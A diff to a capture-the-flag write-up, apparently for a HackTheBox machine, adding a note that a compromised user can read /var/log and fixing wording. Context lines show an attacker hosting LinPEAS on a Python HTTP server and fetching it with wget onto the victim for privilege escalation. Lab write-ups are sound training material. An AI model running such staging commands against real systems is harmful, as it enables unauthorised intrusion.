@@ -66,12 +66,15 @@ Login attempt with the cry0l1t3 user was successed and we got the user.txt flag
 
 User2
 ---------
+Cry0l1t3 is in the adm group in the system so he can read files in /var/log  
+![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/adm%20group.PNG)
+
 Let's use [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to find some privilege escalation vector
 We need to start http-sever on Kali using following command
 ````
 Python -m SimpleHTTPServer
 ````
-And then we can download the script to victim system using wget
+And then we can download the script to the victim system using wget
 ````
 wget http://10.10.14.8:8000/linpeas.sh
 ````
